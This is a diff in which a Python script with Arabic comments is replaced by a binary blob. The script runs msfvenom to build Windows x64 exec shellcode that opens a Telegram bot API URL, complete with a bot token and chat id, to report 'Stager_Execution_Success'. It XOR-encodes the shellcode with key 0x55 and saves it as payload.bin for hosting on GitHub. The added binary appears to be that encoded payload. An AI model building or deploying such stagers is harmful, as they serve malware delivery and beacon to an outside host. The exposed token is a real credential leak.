@@ -1,44 +1,4 @@
-import subprocess
-import sys
-
-def generate_short_payload():
-    # تقليص النص وتجهيز رابط التيليجرام بشكل مباشر وآمن
-    telegram_url = "https://api.telegram.org/bot8950841983:AAF8BtK2AtpdsQ-eS8ulIrxRVHlnPKoKRVg/sendMessage?chat_id=-5348144328&text=Stager_Execution_Success"
-    
-    # استخدام أمر cmd مباشر مع start لتفادي مشاكل القص والـ PowerShell
-    cmd = f"cmd.exe /c start {telegram_url}"
-    
-    print(f"[*] Generating optimized x64 Exec shellcode...")
-    
-    # استخدام msfvenom لتوليد شيلكود تنفيذ أمر خفيف ومباشر لبيئة x64
-    msf_cmd = [
-        "msfvenom",
-        "-p", "windows/x64/exec",
-        f"CMD={cmd}",
-        "-f", "raw"
-    ]
-    
-    try:
-        result = subprocess.run(msf_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
-        raw_shellcode = result.stdout
-    except FileNotFoundError:
-        print("[-] Error: msfvenom is not installed or not in PATH.")
-        sys.exit(1)
-    except subprocess.CalledProcessError as e:
-        print(f"[-] msfvenom failed: {e.stderr.decode()}")
-        sys.exit(1)
-
-    print(f"[+] Raw payload generated successfully. Size: {len(raw_shellcode)} bytes")
-
-    # تطبيق تشفير XOR 0x55 المعتمد حصرياً في الـ Stager الخاص بنا
-    key = 0x55
-    encrypted_payload = bytes([b ^ key for b in raw_shellcode])
-
-    # حفظ الناتج بصيغة payload.bin جاهز للرفع على GitHub
-    with open("payload.bin", "wb") as f:
-        f.write(encrypted_payload)
-
-    print(f"[+] Success! Encrypted payload.bin (XOR 0x55) generated. Size: {len(encrypted_payload)} bytes")
-
-if __name__ == "__main__":
-    generate_short_payload()
+�0�QpeUUU�=�E�U�U�eܒd�ֹuܷ��0-06ܴ܍֑u�681{0-0uz6u&!4'!u=!!%&ozz4%<{!0902'48{:'2z7:!ml`emadlmfom!g!%1&x0m 9'-9;:2z&0;10&&420j6=4!
+<1hx`famdaafgms!0-!h!420'
+-06 !<:;
+ 660&&U
